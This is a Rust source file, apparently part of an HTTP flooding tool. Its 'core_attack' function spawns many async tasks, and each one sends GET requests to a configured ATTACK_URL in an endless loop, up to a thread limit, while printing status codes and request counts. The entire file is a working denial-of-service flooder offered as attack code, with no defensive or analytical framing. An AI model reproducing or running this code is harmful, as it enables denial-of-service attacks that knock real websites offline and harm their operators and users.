use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

use crate::ram_manger::{check_pub_var, PUB_VAR, write_pub_var};

static mut AMOUNT: u128 = 0;

static mut ON_THREADS: u128 = 0;

pub async fn start() {
    unsafe {
        loop {
            core_attack();
        }
    }
}

unsafe fn core_attack() {
    let error_threads = PUB_VAR.lock();
    match error_threads {
        Err(_) => {}
        Ok(mut threads) => {
            if threads.thread_on + 1 < crate::FORCE {
                threads.thread_on += 1;
                drop(threads);
                ON_THREADS += 1;
                tokio::spawn(async {
                    loop {
                        let now = Instant::now();
                        let error_data = request(crate::ATTACK_URL);
                        match error_data.await {
                            Ok(status_code) => {
                                AMOUNT += 1;
                                println!(
                                    "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
                                    ON_THREADS,
                                    status_code.status(),
                                    now.elapsed().as_secs(),
                                    AMOUNT
                                );
                            }
                            Err(data) => {
                                println!(
                                    "On threads: {}, Status ERROR {} Request per 10 Millisecond {}",
                                    ON_THREADS,
                                    data,
                                    AMOUNT
                                );
                            }
                        }
                    }
                });
            } else {
                time_function();
            }
        }
    }
}

unsafe fn time_function() {
    ON_THREADS += 1;
    loop {
        thread::sleep(time::Duration::from_millis(10));
        AMOUNT = 0;
    }
}

async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    }
}
